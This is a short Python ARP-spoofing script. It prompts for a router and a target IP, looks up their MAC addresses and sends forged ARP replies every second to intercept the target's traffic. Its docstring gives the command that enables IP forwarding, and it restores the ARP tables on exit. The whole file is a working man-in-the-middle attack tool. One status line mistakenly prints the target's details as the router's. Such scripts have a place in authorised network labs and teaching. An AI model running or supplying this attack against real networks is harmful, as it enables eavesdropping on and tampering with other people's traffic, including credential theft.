#!/usr/bin/env python3
""" 
arp_spoofer.py - Spoof ARP replies to a target.

To enable ARP spoofing, you need to have the following:

    echo 1 > /proc/sys/net/ipv4/ip_forward # Enable IP forwarding

"""

from time import sleep
import arp_spoofing as arp_spoofing

router_ip = input("Enter the IP address of the router: ")
target_ip = input("Enter the IP address of the target: ")

router_mac_address = arp_spoofing.request_mac_address(router_ip)
target_mac_address = arp_spoofing.request_mac_address(target_ip)

if router_mac_address and target_mac_address:

    print("[*] Target MAC address of {} is {}".format(target_ip, target_mac_address))
    print("[*] Router MAC address of {} is {}".format(target_ip, target_mac_address))

    try:

        while True:
            arp_spoofing.spoof_arp(target_ip, target_mac_address, router_ip)
            arp_spoofing.spoof_arp(router_ip, router_mac_address, target_ip)
            sleep(1)

    except KeyboardInterrupt:
        print('\n[!] Exiting...')
        arp_spoofing.restore_ip(router_ip, target_ip)
        arp_spoofing.restore_ip(target_ip, router_ip)
        exit()

elif not router_mac_address:
    print('[!] Could not get MAC address for router IP: {}'.format(router_ip))

else:
    print('[!] Could not get MAC address for target IP: {}'.format(target_ip))
